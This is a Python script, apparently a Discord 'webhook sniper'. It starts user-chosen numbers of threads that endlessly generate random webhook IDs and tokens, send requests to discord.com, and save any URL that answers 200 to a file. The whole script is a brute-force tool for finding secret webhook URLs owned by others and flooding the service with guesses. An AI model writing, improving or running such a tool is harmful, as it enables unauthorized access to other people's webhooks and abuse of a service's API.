import random, time, threading, requests

choice = "1234567890"

choices = []
letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
for i in letters:
    choices.append(i)
    choices.append(i.lower())

save = input("Do you want to auto save the webhooks? [y/n]: ")
threads = int(input("Enter How Many Threads You Want: "))
delay = float(input("Enter Delay For Each Thread (0=NONE): "))

def sniper():
    while True:
        id = "".join(random.choices(choice, k=18))
        code = "".join(random.choices(choices, k=68))
        webhook = f"https://discord.com/api/webhooks/{id}/{code}"

        r = requests.get(webhook)
        
        if "200" in str(r):
            print(f"Valid Webhook! {webhook}")
            if save.lower() == "y":
                valid = open("valid_webhooks.txt", "a")
                valid.write(webhook+"\n")
                valid.close()
        # why save invalid webhooks?
       #else:
       #    print(f"Invalid Webhook! {webhook}")
       #    if save.lower() == "y":
       #        invalid = open("invalid_webhooks.txt", "a")
       #        invalid.write(webhook+"\n")
       #        invalid.close()
        time.sleep(delay)

for u in range(threads):
    threading.Thread(target=sniper).start()
    print("Started Thread")